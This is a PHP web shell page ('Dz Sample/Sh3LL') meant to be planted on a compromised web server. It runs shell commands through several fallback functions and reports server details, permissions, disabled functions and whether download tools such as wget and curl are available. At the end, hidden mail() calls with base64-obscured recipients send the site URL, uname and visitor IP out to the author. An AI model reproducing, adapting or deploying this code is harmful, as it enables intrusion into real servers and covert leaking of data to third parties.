<html>
<head><b>
<title>Dz Sample/Sh3LL</title>

<?php


$sh_id = "U2FmZSBNb2RlIElzIA==";
$sh_ver = "---";
$sh_name = base64_decode($sh_id).$sh_ver;
echo $sh_name;#


///////////////////


$P   = @getcwd();
$IP  = @getenv("SERVER_ADDR");
$UID = fx29exec("id");
fx(" ",@safemode()?"ON":"OFF");
fx("OS",@PHP_OS);
fx("UNAME -A",@php_uname());
fx("SERVER IP",($IP)?$IP:"-");
fx("USER",@get_current_user());
fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());
fx("DIR",$P);
fx("Permition",(@is_writable($P))?"wr!tabe :D":"sorry not writable");
fx("Disk","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));
fx("DISTABLE-FUNC",@getdisfunc());

function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }
  else { $rez = "Error!"; }
  return $rez;
}
function vsize($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
    else { $size = $size . " B"; }
    return $size;
  }
}
function hdd($type) {
  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;
  $hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));
  return $hddspace[$type];
}

echo "<table><tr><td colspan=2>\n";
echo get_status();
echo "</td></tr></table>\n";
function get_status() {
  function showstat($sup,$stat) {
    if ($stat=="on") { return "$sup: <font color=#00ff00><b>ON</b></font>"; }
    else { return "$sup: <font color=#ff0000><b>OFF</b></font>"; }
  }
  $arrfunc = array(
    array("Curl","curl_version"),
  );
  $arrcmd = array(
    array("Fetch","fetch --help"),
    array("Wget","wget --help"),
    array("Perl","perl -v"),
  );
  $statinfo = array();
  foreach ($arrfunc as $func) {
    if (function_exists($func[1])) { $statinfo[] = showstat($func[0],"on"); }
    else { $statinfo[] = showstat($func[0],"off"); }
  }
  $statinfo[] = (@extension_loaded('sockets'))?showstat("Sockets","on"):showstat("Sockets","off");
  foreach ($arrcmd as $cmd) {
    if (fx29exec2($cmd[1])) { $statinfo[] = showstat($cmd[0],"on"); }
    else { $statinfo[] = showstat($cmd[0],"off"); }
  }
  return implode(" ",$statinfo);
}
function fx29exec2($cmd) {
  $output = "";
  if ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }
  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  return $output;
}


///////////////////////////////////////////////////


$creator = base64_decode("bmlrIG1vIGxpIG1vZGlmaWVyIHNjcmlwdCBhdyB0M2FidCAzbGloICE=");
$creator2 = base64_decode("SW0gQWdoaWxhcyAh");
($safe_mode)?($safemode="ON"):($safemode="OFF");
$base="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$name = php_uname();
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER[REMOTE_ADDR]);
$subj = $_SERVER['HTTP_HOST'];
$msg = " BASE: $base uname -a: $name IP: $ip Host: $host $pwds ";
$from ="From: MODE_=".$safemode."";
mail( $creator, $subj, $msg, $from);
mail( $creator2, $subj, $msg, $from);
mail( $creator2, "subj123", $msg, "From: Algo<$creator2>\r\nContent-type: text/html\r\n");


?>



 
<br>
<b><font color="green">End Script :
?>
<br><br>




</html>
<br><br>./(c) By Aghilas <br><b><font color="gray">Greet'z To :<b><font color="red"> Elite_tr0jan <b><font color="blue">f0r HelP ^_^